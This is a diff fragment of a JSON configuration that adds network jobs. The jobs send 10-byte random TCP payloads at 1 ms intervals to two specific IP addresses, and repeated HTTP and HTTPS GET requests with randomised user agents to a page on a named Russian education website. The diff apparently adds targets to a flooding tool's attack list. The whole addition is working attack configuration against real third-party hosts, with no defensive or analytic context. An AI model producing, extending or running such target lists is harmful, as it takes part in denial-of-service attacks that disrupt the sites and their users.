@@ -45093,6 +45093,62 @@
       }
     },
     {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "185.114.246.191:21",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "http",
+      "count": 1,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://nnovcons.ru/obrazovanie/abiturientam/",
+          "headers": {
+            "User-Agent": "{{ random_user_agent }}"
+          }
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.114.246.191:80",
+            "is_tls": false
+          }
+        }
+      }
+    },
+    {
+      "type": "http",
+      "count": 1,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://nnovcons.ru/obrazovanie/abiturientam/",
+          "headers": {
+            "User-Agent": "{{ random_user_agent }}"
+          }
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.114.246.191:443",
+            "is_tls": true
+          }
+        }
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 1,
+      "args": {
+        "address": "89.109.8.255:4042",
+        "body": "{{ random_payload 10 }}",
+        "interval_ms": 1
+      }
+    },
+    {
       "type": "encrypted",
       "args": {
         "format": "json",
